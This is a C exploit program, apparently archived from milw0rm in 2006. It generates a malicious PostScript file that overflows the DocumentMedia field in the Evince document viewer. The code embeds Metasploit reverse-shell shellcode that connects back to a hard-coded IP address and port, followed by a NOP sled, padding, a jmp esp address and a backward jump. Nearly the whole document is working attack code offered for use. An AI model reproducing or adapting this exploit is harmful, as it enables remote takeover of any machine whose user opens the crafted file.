<html><head><title>Evince Document Viewer (DocumentMedia) Buffer Overflow Exploit</title></head><pre>/*
 * Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
 * Name: evince-ps-field-bof.c
 * Date: 11/27/2006
 * Version: 
 * 	1.00 - creation
 *
 * Other: this idea originaly came from the bid for the 'gv' buffer overflow (20978), i don't
 *  believe it's known until now that evince is also vulnerable. 
 *
 * Compile: gcc -o epfb evince-ps-field-bof.c -std=c99
*/
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;arpa/inet.h&gt;

// insert shellcode here, i'm not going to implement ip/port changing since
// metasploit's shellcode generation engine does it just fine. i had a picky time
// with the shellcodes, there must be some bad bytes. this shellcode from 
// metasploit works but be SURE to set Encoder=None

/* linux_ia32_reverse -  LHOST=67.76.107.14 LPORT=5555 Size=70 Encoder=None http://metasploit.com */
char cb[] =
&quot;\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59&quot;
&quot;\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x43\x4c\x6b\x0e\x66\x68&quot;
&quot;\x15\xb3\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd&quot;
&quot;\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot;
&quot;\x89\xe1\xb0\x0b\xcd\x80&quot;;

// location of &quot;jmp *%esp&quot;
char jmpesp[] = &quot;\x77\xe7\xff\xff&quot;;

int main (int argc, char **argv) {
	FILE *fh;

	if (!(fh = fopen(*(argv+1), &quot;w+b&quot;))) { 
		printf(&quot;%s &lt;file.ps&gt;\n\n&quot;, *(argv));
		printf(&quot;[-] unable to open file '%s' for writing: %s\n&quot;, *(argv+1), strerror(errno));
		exit(1);
	}

	fputs(&quot;%!PS-Adobe-3.0\n&quot;, fh);
	fputs(&quot;%%Title: hello.ps\n&quot;, fh);
	fputs(&quot;%%For: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)\n&quot;, fh);
	fputs(&quot;%%BoundingBox: 24 24 588 768\n&quot;, fh);
	fputs(&quot;%%DocumentMedia: &quot;, fh);
	for (int i = 0; i &lt; 100; i++) 
		fputc(0x90, fh);

	fwrite(cb, strlen(cb), 1, fh);

	for (int i = strlen(cb) + 100; i &lt; 273; i++) 
		fputc('A', fh);

	fwrite(jmpesp, 4, 1, fh);
	fwrite(&quot;\xe9\x02\xff\xff\xff&quot;, 5, 1, fh);

	fputc('\n', fh);

	fputs(&quot;%%DocumentData: Clean7Bit\n&quot;, fh);
	fputs(&quot;%%Orientation: Landscape\n&quot;, fh);
	fputs(&quot;%%Pages: 1\n&quot;, fh);
	fputs(&quot;%%PageOrder: Ascend\n&quot;, fh);
	fputs(&quot;%%+ encoding ISO-8859-1Encoding\n&quot;, fh);
	fputs(&quot;%%EndComments\n&quot;, fh);

	return(0);
}

// milw0rm.com [2006-11-28]</pre></html>